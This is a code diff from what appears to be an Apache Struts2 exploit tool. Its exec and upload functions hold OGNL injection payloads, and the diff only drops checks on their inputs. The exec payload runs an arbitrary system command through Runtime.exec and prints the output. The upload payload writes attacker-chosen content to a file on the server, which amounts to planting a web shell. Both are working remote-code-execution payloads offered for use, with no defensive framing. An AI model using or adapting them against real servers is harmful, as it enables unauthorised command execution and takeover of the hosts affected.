@@ -34,8 +34,6 @@ def prove(data):
 def exec(data=None):
     data = init(data, 'struts')
     if data['url'] != None:
-        if 'cmd' not in data.keys() :
-            raise Exception("None cmd ")
         cmd = data['cmd']
         exec_poc = '''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close()):xx.toString.json&cmd=%COMMAND%&pp=\\\\AAAA&ppp= &encoding=UTF-8'''
         headers = {}
@@ -55,10 +53,6 @@ def upload(data=None):
     data = init(data, 'struts')
     if data['url'] != None:
         upload_poc = '''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=@org.apache.struts2.ServletActionContext@getRequest(),#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#path=#req.getRealPath(#parameters.pp[0]),new java.io.BufferedWriter(new java.io.FileWriter(#parameters.shellname[0]).append(#parameters.shellContent[0])).close(),#w.print(#parameters.info1[0]),#w.print(#parameters.info2[0]),#w.print(#req.getContextPath()),#w.close()):xx.toString.json&shellname=%PATH%&shellContent=%FILECONTENT%&encoding=UTF-8&pp=/&info1=oko&info2=kok/'''
-        if 'srcpath' not in data.keys() :
-            raise Exception("None srcpath ")
-        if 'despath' not in data.keys() :
-            raise Exception("None despath ")
         despath = data['despath']
         content = _read_file(data['srcpath'])
         headers =  {}
